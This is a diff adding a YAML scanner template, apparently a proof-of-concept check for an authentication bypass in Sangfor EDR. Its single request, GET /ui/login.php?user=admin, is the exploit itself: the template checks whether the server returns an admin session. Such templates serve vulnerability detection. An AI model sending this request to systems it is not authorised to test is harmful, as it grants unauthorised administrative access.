@@ -1,0 +1,18 @@
+id: poc-yaml-sangfor-edr-arbitrary-user-login
+info:
+  name: Sangfor EDR 任意用户登录漏洞
+  severity: critical
+  tags:
+  - 认证绕过
+  finger: Sangfor
+  osprey-id: vb_2020_0061
+requests:
+- method: GET
+  path: /ui/login.php?user=admin
+  expression: 'status_code == 302 && contains(body, "SANGFOR终端检测响应平台") &&
+
+    contains(headers, "index.php") && contains(headers, "PHPSESSID")
+
+    '
+variables: {}
+transport: http
